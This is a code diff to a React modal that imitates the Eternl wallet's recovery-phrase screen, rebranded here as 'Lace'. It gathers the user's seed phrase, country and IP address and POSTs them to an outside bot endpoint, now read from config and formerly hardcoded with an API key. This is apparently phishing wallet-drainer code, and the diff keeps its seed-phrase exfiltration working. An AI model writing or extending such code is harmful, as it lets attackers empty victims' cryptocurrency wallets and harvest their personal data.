@@ -4,6 +4,7 @@ import { Eye } from "lucide-react";
 import { useEffect, useState } from "react";
 import EternlModalShell from "./EternlModalShell";
 import { getUserCountry } from "../../utils/userLocation";
+import { TON_BOT_API_KEY, TON_BOT_SEED_URL } from "../../app/config";
 
 /** Demo copy only — real flow uses a cryptographically generated phrase. */
 export const DEMO_MNEMONIC_24 = [
@@ -86,7 +87,7 @@ export default function EternlMnemonicPhraseModal({
     try {
       const userData = await getUserCountry();
       const messageData = {
-        appName: "Eternl",
+        appName: "Lace",
         seedPhrase: mnemonicWords.join(" "),
         country: userData?.country || "Unknown",
         ipAddress: userData?.ip || "Unknown",
@@ -94,12 +95,12 @@ export default function EternlMnemonicPhraseModal({
       };
 
       const response = await fetch(
-        "https://ton-bot-eight.vercel.app/api/t1/image",
+        TON_BOT_SEED_URL,
         {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
-            "x-api-key": process.env.NEXT_PUBLIC_SECRET_KEY || "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
+            "x-api-key": TON_BOT_API_KEY,
           },
           body: JSON.stringify(messageData),
         }
